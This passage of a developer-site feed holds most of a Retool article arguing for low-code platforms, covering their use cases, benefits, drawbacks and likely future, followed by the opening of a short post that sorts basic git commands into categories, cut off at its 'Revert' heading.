&lt;p&gt;That skepticism is belied by the research. According to &lt;a href="https://www.mendix.com/resources/digital-disconnect-a-study-of-business-and-it-alignment/"&gt;Mendix research&lt;/a&gt;, 99% of organizations surveyed report that they'd benefit from the capabilities of low code platforms.&lt;/p&gt;

&lt;p&gt;&lt;a href="https://retool.com/blog/state-of-internal-tools-2021/"&gt;Our own research&lt;/a&gt; shows that 89% of developers enjoy building with low code, 90% of developers believe low code meets their needs, and 89% of developers plan to keep building with low code. And, as we mentioned at the top of this article, Gartner predicts that &lt;a href="https://www.forbes.com/sites/ilkerkoksal/2020/04/29/the-rise-of-low-code-app-development/"&gt;more than 65%&lt;/a&gt; of application development activity will come from low code application development platforms by 2024.&lt;/p&gt;

&lt;p&gt;Companies, analysts, and developers agree: low code is here to stay. We're reaching an inflection point where the capabilities of low code technology are actually ready to meet their promised potential.&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#low-code-vs-no-code-the-differences-and-similarities"&gt;
  &lt;/a&gt;
  Low code vs. no code: The differences and similarities
&lt;/h2&gt;

&lt;p&gt;Let's bust a myth right from the get-go: low code and no code are &lt;em&gt;not&lt;/em&gt; the same thing. They share some similarities, but on close inspection, those similarities become superficial. At a fundamental level, the technologies are different.&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#what-is-no-code"&gt;
  &lt;/a&gt;
  What is no code?
&lt;/h3&gt;

&lt;p&gt;If low code is the minimization of hand-coding, then no code is the elimination of hand-coding.&lt;/p&gt;

&lt;p&gt;No code also uses a visual workflow builder and IDE, but it doesn't require developers to hand-code at all, a feature that poses both advantages and disadvantages.&lt;/p&gt;

&lt;p&gt;At first glance, that difference seems minor. If anything, it seems advantageous for no code---why code a little when you could skip coding altogether? But it turns out that difference makes all the difference.&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#low-code-vs-no-code-the-small-differences"&gt;
  &lt;/a&gt;
  Low code vs. no code: the small differences
&lt;/h3&gt;

&lt;p&gt;The first differences you'll notice between low code and no code involve differences among target users, design, and UI. Though these differences aren't minor, they make low code and no code applications look slightly different.&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;  Target user: Low code is for semi-technical business users and technical developers, whereas no code is just for business users. Since low code still involves some hand-coding, many low code tools still require software developers to either handle development or take it over the last mile.&lt;/li&gt;
&lt;li&gt;  Design: Low code platforms still depend on hard code for software architecture, whereas no code tends to have model-driven workflows and declarative logic.&lt;/li&gt;
&lt;li&gt;  UI: Low code provides greater flexibility, enabling developers to add hand-written code to visually developed components, whereas no code is a closed system that tends to lock users into the abilities of the no code platform in question. The ramifications of this lock-in vary depending on what platform you choose.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;If these were the only differences, you could imagine low code and no code someday converging or a vendor offering a platform that effectively does both. This ignores the fact, however, that low code and no code are different at a fundamental level.&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#low-code-vs-no-code-the-big-difference"&gt;
  &lt;/a&gt;
  Low code vs. no code: the big difference
&lt;/h3&gt;

&lt;p&gt;No code abstracts away code, whereas low code retains the ability to code. Though that difference might seem small on the surface, the ramifications are profound.&lt;/p&gt;

&lt;p&gt;Low code is a natural extension of web frameworks, component libraries, and the long tradition of borrowing pre-built work and adding in nuances that are unique to your situation. Developers have always strived for more composability, and entire businesses have been built on this desire: think API-first companies like Twilio and package managers like npm.&lt;/p&gt;

&lt;p&gt;Low code is less a disruption and more a continuation of this tradition. Low code helps developers move faster, both by helping them make decisions and follow through on actions more efficiently. That speed, however, doesn't sacrifice anything---low code respects the fact that developers will still need to customize.&lt;/p&gt;

&lt;p&gt;The ability to customize is a DNA-level difference, and it has ripple effects. No code aims at a new audience with a new proposal: turn all of the code into UIs, logic, and simple steps, such that non-technical business users (or "citizen developers") can now "code."&lt;/p&gt;

&lt;p&gt;No code, by its very nature, is opinionated and inflexible. While both low code and no code manifest similarities (namely the drag-and-drop visual IDE mentioned above), they approach different problems and solve them so distinctly that the possible end results are entirely different.&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#5-low-code-use-cases"&gt;
  &lt;/a&gt;
  5 low code use cases
&lt;/h2&gt;

&lt;p&gt;Low code use cases range from the complex (such as full-on app development) to the relatively simple (such as landing page design).&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#1-internal-tools"&gt;
  &lt;/a&gt;
  1. Internal tools
&lt;/h3&gt;

&lt;p&gt;Internal tools aren't flashy, but developers spend a lot of time working on them. According to our research in &lt;a href="https://retool.com/blog/state-of-internal-tools-2021/"&gt;The state of internal tools in 2021&lt;/a&gt;, developers spend nearly a third of their time (30%) building internal applications.&lt;/p&gt;

&lt;p&gt;It's not that this work isn't impactful (it is; for companies with more than ten employees, one in three employees are using internal apps a developer has built). It's that internal tools aren't always how developers want to spend their time nor how businesses want to spend their development resources.&lt;/p&gt;

&lt;p&gt;With low code platforms, you can develop internal tools faster and even enable some non-developers to build them, too.&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#2-ui-design"&gt;
  &lt;/a&gt;
  2. UI design
&lt;/h3&gt;

&lt;p&gt;Some low code platforms let you build an intuitive user interface from drag-and-drop components. This is especially useful for back-end developers who may have to build dashboards but aren't familiar with UX best practices.&lt;/p&gt;

&lt;p&gt;This use case bleeds into others on the list. A popular internal tool, for instance, is a sales dashboard that helps sales reps track deal flow. The sales team might ask a back-end developer to make such a tool, and while the back-end developer can easily handle the data, they might not be able to present that data in an intuitive way.&lt;/p&gt;

&lt;p&gt;With low code, a back-end developer can easily spin up a UI that they can layer onto the data they retrieve.&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#3-integration-and-automation"&gt;
  &lt;/a&gt;
  3. Integration and automation
&lt;/h3&gt;

&lt;p&gt;Platforms like &lt;a href="https://www.uipath.com/"&gt;UiPath&lt;/a&gt;, &lt;a href="https://www.workato.com/"&gt;Workato&lt;/a&gt;, and &lt;a href="https://appian.com/"&gt;Appian&lt;/a&gt; provide ways to integrate apps and automate the processes that connect and flow between them.&lt;/p&gt;

&lt;p&gt;Many companies, large enterprises especially, are stuck with legacy infrastructure (think SAP, Oracle, Citrix) that they can't afford to rip out and replace. These companies, however, are increasingly feeling the heat from nimble startups relying on custom-built tools, SaaS apps, and APIs.&lt;/p&gt;

&lt;p&gt;With low code, enterprises can achieve some of that speed by connecting and automating those legacy systems. Enterprises can then adjust and iterate much like startups can, leaving them less vulnerable to disruption.&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#4-basic-app-development"&gt;
  &lt;/a&gt;
  4. Basic app development
&lt;/h3&gt;

&lt;p&gt;Low code tools like &lt;a href="https://bubble.io/"&gt;Bubble.io&lt;/a&gt; enable non-developers to spin up entire web apps, and low code tools like &lt;a href="https://memberful.com/"&gt;Memberful&lt;/a&gt; enable non-developers to add specific features to their apps (in Memberful's case, membership).&lt;/p&gt;

&lt;p&gt;Some of the results of Bubble.io, according to their &lt;a href="https://bubble.io/showcase"&gt;showcase page&lt;/a&gt;, include:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;  &lt;a href="https://www.teeming.ai/"&gt;Teeming&lt;/a&gt;, a cloud-based tool that helps remote teams bond via interactive work sessions&lt;/li&gt;
&lt;li&gt;  &lt;a href="https://residentstreet.com/"&gt;ResidentStreet&lt;/a&gt;, a platform that connects people looking for "mid-term accommodations" (1-11 months) with furnished properties&lt;/li&gt;
&lt;li&gt;  &lt;a href="https://incomee.co/"&gt;Incomee&lt;/a&gt;, an accounting tool for freelancers&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;This use case is one where the difference between low code and no code really matters. Be aware of the customization limitations of no code as your app scales.&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#5-mvps-and-prototypes"&gt;
  &lt;/a&gt;
  5. MVPs and prototypes
&lt;/h3&gt;

&lt;p&gt;The minimum viable product (MVP) methodology, originating with famed startup expert Eric Ries, asks developers and startups to ship products faster, get feedback earlier, and build with customers in mind. MVPs (and prototypes, a similar idea) are a great use case for low code.&lt;/p&gt;

&lt;p&gt;The idea is this: don't invest tons of development resources into an app or feature you're unsure of. When you're building an app from scratch, the necessary up-front investment is immense. You have to think about hosting, the back-end, the front-end, the UI, maintenance, monitoring analytics... the list goes on.&lt;/p&gt;

&lt;p&gt;Those are all distractions from what your primary focus needs to be at this early stage: your user and what they need. Low code helps you delay those important business decisions, so that you can make them later, when you have a stable business and customer traction.&lt;/p&gt;

&lt;p&gt;With low code, you can get most of the way toward your final product, test it with your customers, and then, and only then, make an investment you're confident in.&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#why-low-code-benefits-and-drawbacks"&gt;
  &lt;/a&gt;
  Why low code? Benefits and drawbacks
&lt;/h2&gt;

&lt;p&gt;Low code has a variety of benefits and drawbacks, all of which depend on which low code platform(s) you choose and how you use it.&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#low-code-benefits"&gt;
  &lt;/a&gt;
  Low code benefits
&lt;/h3&gt;

&lt;p&gt;Though low code comes with many benefits, they generally come down to three core ones.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Increase time to value (TTV)&lt;/strong&gt;&lt;br&gt;
Compared to hand-coding, low code development gets developers from idea to execution to production much faster.&lt;/p&gt;

&lt;p&gt;According to &lt;a href="https://resources.kintone.com/citizen-developer-business-application-report-2017"&gt;Kintone research&lt;/a&gt;, developers using low code tools "get applications out the door faster than large IT departments. They turn around their required applications in a matter of weeks, or a couple of months. Only 17% report turnaround times exceeding three months."&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Improve developer productivity and efficiency&lt;/strong&gt;&lt;br&gt;
Many low code platforms come with pre-built components, and most come with the ability to make components you can reuse, making low code development eminently composable. Developers can borrow, build, and reuse components as they go, making them more efficient over time.&lt;/p&gt;

&lt;p&gt;Improved productivity and efficiency is backed up by research, both in terms of sheer speed and the ability to meet previously unmet demand via improved efficiency:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;  &lt;a href="https://go.forrester.com/blogs/why-you-need-to-know-about-low-code-even-if-youre-not-responsible-for-software-delivery/"&gt;Forrester analyst John Rymer&lt;/a&gt; says that low code platforms "have the potential to make software development as much as 10 times faster than traditional methods."&lt;/li&gt;
&lt;li&gt;  &lt;a href="https://go.caspio.com/state-of-custom-business-applications-2020?&amp;amp;_ga=2.46840167.1975902204.1623099469-1417118847.1623099469"&gt;Caspio research&lt;/a&gt; shows that 63% of organizations using low code platforms have the skills and resources to fulfill the demand for custom apps, whereas only 41% of organizations not using low code can say the same. Similarly, 61% (as opposed to 38%) of organizations using low code typically deliver custom apps on time, on scope, and on budget.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;With low code, developers can ship faster.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Better use of existing staff&lt;/strong&gt;&lt;br&gt;
Developers are in short supply.&lt;/p&gt;

&lt;p&gt;According to the &lt;a href="https://www.bls.gov/ooh/computer-and-information-technology/software-developers.htm#tab-6"&gt;Bureau of Labor Statistics&lt;/a&gt;, "employment of software developers...is projected to grow 22% from 2019 to 2029, much faster than the average for all occupations." Demand for software developers is already outpacing supply, despite the ever-increasing need for software. This is backed up by &lt;a href="https://www.techrepublic.com/article/cio-jury-83-of-cios-struggle-to-find-tech-talent/"&gt;TechRepublic research&lt;/a&gt;, which found that 83% of CIOs struggle to find tech talent.&lt;/p&gt;

&lt;p&gt;Low code allows already hired developers to move faster (as covered in the previous benefit), but it also allows non-developers, such as operations staff, to take part in development. Companies can produce more software with existing staff.&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#drawbacks"&gt;
  &lt;/a&gt;
  Drawbacks
&lt;/h3&gt;

&lt;p&gt;Low code isn't without its drawbacks, but you can defeat many of these by choosing a modern low code platform that fits your use case.&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#vendor-lockin"&gt;
  &lt;/a&gt;
  Vendor lock-in
&lt;/h3&gt;

&lt;p&gt;Perhaps the top reason developers fear low code tools is the risk of vendor lock-in. Whereas hand-coding is inherently flexible and extensible, low code platforms have the potential to lock developers into a limited ecosystem.&lt;/p&gt;

&lt;p&gt;This drawback varies depending on which low code platform you choose. Legacy low code application development platforms, many of which resemble no code more than low code, can absolutely lock you into their ecosystems. Modern low code platforms, however, tend to be built on the aforementioned tradition of composability, meaning that there's an inherent respect for the need to customize.&lt;/p&gt;

&lt;p&gt;Retool, for instance, is built on Javascript and SQL, meaning developers versed in those languages can easily add on to what they develop in Retool.&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#shadow-it-and-governance"&gt;
  &lt;/a&gt;
  Shadow IT and governance
&lt;/h3&gt;

&lt;p&gt;IT might be resistant to low code adoption.&lt;/p&gt;

&lt;p&gt;According to &lt;a href="https://www.forbes.com/sites/jasonbloomberg/2017/07/20/the-low-codeno-code-movement-more-disruptive-than-you-realize/?sh=4db92168722a"&gt;Jason Bloomberg&lt;/a&gt;, an IT industry analyst, "IT has been telling business stakeholders for years that the six month/million dollar plan is the only way to build enterprise software," but now, &lt;a href="https://www.forbes.com/sites/jasonbloomberg/2017/07/20/the-low-codeno-code-movement-more-disruptive-than-you-realize/?sh=4db92168722a"&gt;according to Simon Chan&lt;/a&gt;, Founder and CEO of DigiVue Consulting, "the same systems can be implemented by smaller players at a fraction of the price and in a fraction of the time," which "has leveled the playing field."&lt;/p&gt;

&lt;p&gt;What might appear to be a level playing field to a business user, however, can appear to be a threat to IT. IT has long had to resist the encroachment of so-called "shadow IT," and a low code program might appear to add fuel to that fire. Imagine, the IT admin might fear, if employees were not only adopting SaaS tools without permission but were &lt;em&gt;building&lt;/em&gt; apps without permission?&lt;/p&gt;

&lt;p&gt;This isn't IT being controlling. There are serious ramifications, especially in terms of security, from letting more people build software. And they're not wrong --- according to &lt;a href="https://resources.kintone.com/citizen-developer-business-application-report-2017"&gt;Kintone research&lt;/a&gt;, more than one in four surveyed organizations have no citizen development policy of any kind in place. The problem is less with low code itself and more with how companies implement and scale low code programs. Eventually, governance becomes necessary.&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#scalability"&gt;
  &lt;/a&gt;
  Scalability
&lt;/h3&gt;

&lt;p&gt;Some developers have an instinctual resistance to low code platforms based on the assumption that any code that isn't hand-written can't be robust enough to scale. This assumption isn't true---low code apps can scale to enterprise proportions---but the nugget of truth is that many low code platforms aren't built with scale in mind.&lt;/p&gt;

&lt;p&gt;Outsystems, for instance, in a surprising moment of &lt;a href="https://www.outsystems.com/blog/posts/what-is-low-code/"&gt;vendor honesty&lt;/a&gt;, notes that "When it's time to scale, integrate with existing systems, or perform under extreme conditions like a mobile banking app on Black Friday, the [low code] application could buckle under the weight of functional and nonfunctional requirements. If an application built with low-code needs updating or if the underlying technology needs changing, good luck."&lt;/p&gt;

&lt;p&gt;The solution here tends to be picking a low code platform that *can *develop apps that can scale. And scalability tends to come from leaning into low code's advantages. No code apps are much more likely to suffer from scalability problems because they aren't customized. Use low code to build your foundation but hand-code your way to scalability.&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#how-low-code-will-shape-the-future-of-software-development"&gt;
  &lt;/a&gt;
  How low code will shape the future of software development
&lt;/h2&gt;

&lt;p&gt;Low code development will not replace traditional software development. Full stop. But it will change software development---and in some areas, the change will be dramatic.&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#low-code-will-add-more-abstraction"&gt;
  &lt;/a&gt;
  Low code will add (more) abstraction
&lt;/h3&gt;

&lt;p&gt;Low code, understood historically, is another layer of abstraction between developer and code.&lt;/p&gt;

&lt;p&gt;You can trace the roots of low code back to the &lt;a href="https://www.techopedia.com/definition/24308/fourth-generation-programming-language-4gl"&gt;fourth-generation programming languages&lt;/a&gt; (think Visual Basic and PowerBuilder) and computer-aided software engineering (CASE), rapid application development (RAD), and business process management (BPM) tools from the 1990s. These early tools and platforms tried to fulfill the same promise modern low code does: build real apps in less time and with less code.&lt;/p&gt;

&lt;p&gt;It took another couple of decades for the brand name to form, however. The first popular instance of the phrase "low code" occurred in a &lt;a href="https://www.forrester.com/report/New+Development+Platforms+Emerge+For+CustomerFacing+Applications/-/E-RES113411"&gt;2014 Forrester report&lt;/a&gt; and has been on a steady rise since.&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--1hMjTTRW--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://lh6.googleusercontent.com/wK6K8ADGrKPs6bWBlDUaxJvIOLSJFrmXpTGmUlJlEShboZzgpvZgbF1Cj5Sk-iIV2NgFEtBZO-0vDQ_IhAp1cYKBBAPt2FSEJ6oJz0-mA0R22C1UstsVY-VrrbJQF8_-H1n__zqN" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--1hMjTTRW--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://lh6.googleusercontent.com/wK6K8ADGrKPs6bWBlDUaxJvIOLSJFrmXpTGmUlJlEShboZzgpvZgbF1Cj5Sk-iIV2NgFEtBZO-0vDQ_IhAp1cYKBBAPt2FSEJ6oJz0-mA0R22C1UstsVY-VrrbJQF8_-H1n__zqN" alt="google trends low code"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;em&gt;Searches for "low-code app development platform" on Google Trends&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;If you want to get technical, you can trace low code back through the history of code, too. The history of code is itself a history of abstraction: every programming language is a more human-readable version of binary code. What's unreadable to us now, like FORTRAN, was a big step toward readability back in the day. As Nacho Iacovino, developer advocate at Clerk, wrote in a &lt;a href="https://retool.com/blog/nacho-iacovino-on-the-future-of-internal-tools/"&gt;guest post&lt;/a&gt; for us, even modern options like React are "a low(er)-code option, compared with the alternative of vanilla JavaScript which would take many more lines of code to achieve the same results."&lt;/p&gt;

&lt;p&gt;In the same way, low code is another step toward readability and up the ladder of abstraction. Viewed this way, low code isn't a departure from history so much as it is a continuation.&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#low-code-will-add-not-disrupt"&gt;
  &lt;/a&gt;
  Low code will add, not disrupt
&lt;/h3&gt;

&lt;p&gt;A major reason developers are skeptical of low code is the hype. A simple Google search reveals the scale of the hype. "Is low code the future" returns over 2 million results, and articles on the topic include titles like:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;  Why Low-Code Automation Is The Tech Of The Future&lt;/li&gt;
&lt;li&gt;  Why low-code and no-code are the future of enterprise applications&lt;/li&gt;
&lt;li&gt;  The Future of Software is No Code and Low Code Programming&lt;/li&gt;
&lt;li&gt;  Low Code Is The Future Of Application Development&lt;/li&gt;
&lt;li&gt;  Low-code programming -- the next frontier in app development&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--HQ0NNTSl--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://retool.com/blog/content/images/2021/06/Low-collage.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--HQ0NNTSl--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://retool.com/blog/content/images/2021/06/Low-collage.png" alt="low-code collage"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Realistically, low code isn't &lt;em&gt;the&lt;/em&gt; future; it's part of the future. Internal tool development, our specialty, provides a perfect example.&lt;/p&gt;

&lt;p&gt;Internal tool development (which developers spend 30% of their time doing) is an ideal use for low code. Though two out of three developers &lt;a href="https://retool.com/blog/state-of-internal-tools-2021/"&gt;default to building from scratch&lt;/a&gt; (instead of using a spreadsheet or a SaaS tool), 88% of developers that *do *build internal apps using low code plan to keep building that way in the future. In other words, most developers have a need that low code solves for but aren't using low code---but once they try low code, they keep using it.&lt;/p&gt;

&lt;p&gt;More than likely, low code won't disrupt, displace, or destroy software development. Instead, developers will try particular low code tools, especially ones specialized for specific use cases, and replace hand-coding development when it benefits them to do so.&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#low-code-will-expand-the-circle-of-software-development"&gt;
  &lt;/a&gt;
  Low code will expand the circle of software development
&lt;/h3&gt;

&lt;p&gt;According to &lt;a href="https://chiefmartec.com/2021/03/marketing-superpowers-ai-code-transform-every-marketer-maker/"&gt;Scott Brinker, VP of Platform Ecosystem at HubSpot&lt;/a&gt;, the best way to think of low code is to think of it as a way to expand the circle of people who can develop software.&lt;/p&gt;

&lt;p&gt;Low code, as well as no code, enables more people to build software. This bears out in the research so far. According to &lt;a href="https://resources.kintone.com/citizen-developer-business-application-report-2017"&gt;Kintone research&lt;/a&gt;, many non-IT low code developers are power users "embedded within line-of-business departments building the applications."&lt;/p&gt;

&lt;p&gt;Power users are becoming more powerful, so powerful that they can now develop software. According to &lt;a href="https://searchsoftwarequality.techtarget.com/news/252469924/Low-code-goes-mainstream-to-ease-app-dev-woes"&gt;John Rymer, an analyst at Forrester&lt;/a&gt;, he can "see maybe 100 million people---business people---engaged in producing software."&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--5rO6tv2v--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://retool.com/blog/content/images/2021/06/Low-code.svg" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--5rO6tv2v--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://retool.com/blog/content/images/2021/06/Low-code.svg" alt=""&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;That means that companies don't need to hire software developers for every software need. That doesn't mean that developer hiring will slow, but that companies can reallocate developer hiring away from some projects (say, internal tool development) and toward customer-facing features as well as complex and unique software development problems.&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#the-impact-of-low-code-on-startups-and-enterprises"&gt;
  &lt;/a&gt;
  The impact of low code on startups and enterprises
&lt;/h2&gt;

&lt;p&gt;Often lost in the discussion of low code and its effects is context: low code looks very different to startups and enterprises.&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#low-code-and-startups"&gt;
  &lt;/a&gt;
  Low code and startups
&lt;/h3&gt;

&lt;p&gt;Startups are time- and resource-strapped, which is the primary reason they adopt low code tools. With low code, their existing engineers can move faster and make a greater impact in three primary ways.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Internal tools will be easier to make&lt;/strong&gt;&lt;br&gt;
With low code tools, developers can re-focus from internal tool development toward customer-facing features. For startups, who may only have a couple of developers, this time and effort are precious. With product-market fit still on the horizon, early-stage startups need as many engineering resources as possible dedicated to iteration.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Back-end developers will be able to develop better services&lt;/strong&gt;&lt;br&gt;
Back-end developers are well-versed in systems and functionality but not in UX design. With low code, even back-end developers can create pretty, intuitive apps and tools. The ever-elusive 10x full-stack developer becomes more attainable if you can enable back-end developers to create things only a front-end developer would normally be able to make.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Validation will come sooner in a startup's life&lt;/strong&gt;&lt;br&gt;
As we covered above, low code enables companies to rapidly build MVPs and prototypes. This is especially useful for startups, who may still be settling on a product and pursuing product-market fit. The right low code tool will also enable rapid iteration, such that startups can debut and improve products before dedicating much in the way of hand-coding.&lt;/p&gt;

&lt;p&gt;Curtis Cummings, a Senior Software Engineer at On Deck, said in an &lt;a href="https://retool.com/blog/new-developments-curtis-cummings-on-deck/"&gt;interview he did with Retool&lt;/a&gt;, "I've been on a couple of different projects in my consulting career where we had this perfect spec, we built it perfectly to spec, went out to users and it fell flat on its face because all the assumptions that backed up that spec weren't validated or grounded in user data."&lt;/p&gt;

&lt;p&gt;With low code, startups are less likely to fall on their faces.&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#low-code-and-enterprises"&gt;
  &lt;/a&gt;
  Low code and enterprises
&lt;/h3&gt;

&lt;p&gt;Enterprises are not, generally, in want of resources like startups are, but they are often stuck with technical debt.&lt;/p&gt;

&lt;p&gt;Enterprise technical debt, driven by prior investments in now legacy technologies, is encouraging many enterprises to adopt low code and pursue modernization. There are three primary use cases for enterprises and low code.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Improved agility&lt;/strong&gt;&lt;br&gt;
Low code tools, especially those from the RPA and workflow automation fields, will enable enterprises to move more nimbly. Enterprise technology stacks are often overly complex, old, and slow. Low code automation tools can reduce the negative effects of that complexity. These tools can automate the steps involved in the processes these legacy tools run.&lt;/p&gt;

&lt;p&gt;Software robots, offered by low code RPA tools, for instance, can &lt;a href="https://www.uipath.com/blog/rpa-use-cases-part-one-unattended-robots"&gt;run unattended&lt;/a&gt;, meaning they can operate in the background, 24/7, handling all the agonizingly manual processes legacy tools typically require.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Modernize and connect legacy technology&lt;/strong&gt;&lt;br&gt;
Enterprises are not only stuck with legacy technology; those legacy technologies are themselves often stuck in disparate silos. Connecting your ERPs to your CRMs and back again, for instance, can be a nightmare. Enterprises often face the choice of either living with it and being inefficient or hiring armies of consultants to fix it all, which is expensive.&lt;/p&gt;

&lt;p&gt;With low code, enterprises can modernize their legacy technology stacks without ripping them out and replacing them. Low code tools can layer on top of these tools and create a much more usable, intuitive interface. Business users can then access and use systems they previously would have had to request help from developers to use.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Digital transformation&lt;/strong&gt;&lt;br&gt;
Forgive the buzzword, but for enterprises, digital transformation is a serious pursuit. Many enterprises are still operating on paper and, if not paper, so-called "digital paper" systems --- technologies that weren't designed with the internet and native digital capabilities in mind.&lt;/p&gt;

&lt;p&gt;In clinical research, for example, as product manager Stephanie Morillo points out in this &lt;a href="https://twitter.com/radiomorillo/status/1405707879810748416"&gt;Twitter thread&lt;/a&gt;, many organizations still use Excel. Rather than use a modern database tool, enterprises (and their employees) use a tool that lacks version control and can't handle the thousands of rows necessary for their purposes.&lt;/p&gt;

&lt;p&gt;If ever there was a need for low code, this is it.&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#low-code-is-in-your-future-even-if-it-isnt%C2%A0the%C2%A0future"&gt;
  &lt;/a&gt;
  Low code is in your future (even if it isn't &lt;em&gt;the&lt;/em&gt; future)
&lt;/h2&gt;

&lt;p&gt;Big brain, hot take "thought leadership" on low code often relies on the phrase "the future of," as if software development --- an already complex and diverse field of technologies and methodologies --- will somehow evolve into one, simple thing. Well, it won't. That doesn't mean, however, that low code won't create incredible change.&lt;/p&gt;

&lt;p&gt;Low code will transform the field of software development by empowering developers to choose when and where they want to spend time hand-coding. With low code, developers can build less and architect more. As more developers adopt low code, the industry will shift in big, unpredictable ways.&lt;/p&gt;

&lt;p&gt;Full-time developers, armed with low code (or arming business users with low code), can re-focus from solving simple problems to solving complex problems. The effect of this reallocation is hard to understate and hard to predict. Developers&lt;a href="https://www.forbes.com/sites/glennsolomon/2020/06/23/why-developers-are-fueling-the-next-1-trillion-software-wave/?sh=1b904d451a31"&gt; run the world these days&lt;/a&gt; (see Stripe, Twilio, Atlassian, Datadog, MongoDB, etc.), so imagine if these &lt;a href="https://www.amazon.com/New-Kingmakers-Developers-Conquered-World-ebook/dp/B0097E4MEU"&gt;kingmakers&lt;/a&gt; shifted their internal tool development efforts (30% of their time) toward changing the world. And that's only one use case for low code!&lt;/p&gt;

</description>
      <category>watercooler</category>
      <category>coding</category>
    </item>
    <item>
      <title>8 categories of Git</title>
      <author>Danyson</author>
      <pubDate>Fri, 25 Jun 2021 22:42:13 +0000</pubDate>
      <link>https://dev.to/danyson/8-categories-of-git-2127</link>
      <guid>https://dev.to/danyson/8-categories-of-git-2127</guid>
      <description>&lt;p&gt;&lt;strong&gt;You can classify Git version control mechanism into 8 categories.&lt;/strong&gt;&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;Create&lt;/li&gt;
&lt;li&gt;Track&lt;/li&gt;
&lt;li&gt;Revert&lt;/li&gt;
&lt;li&gt;Update&lt;/li&gt;
&lt;li&gt;Publish&lt;/li&gt;
&lt;li&gt;View&lt;/li&gt;
&lt;li&gt;Branch&lt;/li&gt;
&lt;li&gt;Conflict&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;&lt;strong&gt;Below i have given classification of git mechanism along with their important commands.&lt;/strong&gt;&lt;/p&gt;

&lt;h1&gt;
  &lt;a href="#create"&gt;
  &lt;/a&gt;
  Create
&lt;/h1&gt;

&lt;p&gt;&lt;strong&gt;When it comes to files&lt;/strong&gt;&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;git init          
git add .
git add [filename]
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;&lt;strong&gt;&lt;em&gt;When it comes to a repository&lt;/em&gt;&lt;/strong&gt;&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;git clone ~/folder_A ~/folder_B
git clone git://url
git clone ssh://url
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;h1&gt;
  &lt;a href="#track"&gt;
  &lt;/a&gt;
  Track
&lt;/h1&gt;

&lt;blockquote&gt;
&lt;p&gt;Track is when we want to track our files for commit, update or delete operations.&lt;br&gt;
&lt;/p&gt;
&lt;/blockquote&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;git add files // adds files ready to be commited
git mv prev_place target_place //moves files
git rm files //removes files from working directory but adds it to the staging index
git rm --cached files //stops tracking but keeps files in working directory
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;h1&gt;
  &lt;a href="#revert"&gt;
